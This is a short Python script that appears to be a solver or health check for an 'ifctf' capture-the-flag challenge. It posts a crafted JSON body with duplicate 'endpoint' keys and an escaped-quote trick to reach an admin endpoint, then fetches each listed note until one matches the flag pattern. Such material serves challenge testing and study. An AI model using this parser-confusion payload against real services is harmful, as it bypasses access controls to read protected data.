#!/usr/bin/env python3
from argparse import ArgumentParser
from requests import post
from re import match


def main(url):
    r = post(
        url, data='{"endpoint" : "admin","asd\\" : null}" : "","endpoint" : "get_note"}'
    )

    response = r.json()['response']

    for x in response.split(','):
        r = post(
            url, data=f'{{"endpoint" : "get_note","note_id":"{x}"}}'
        )
        content = r.json()['response']
        if match(r'ifctf{.*}', content):
            print("OK - Flag found")
            exit(0)
    print("ERR - flag not found")
    exit(1)


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('--url', type=str, default='http://localhost/')
    args = parser.parse_args()
    main(args.url)
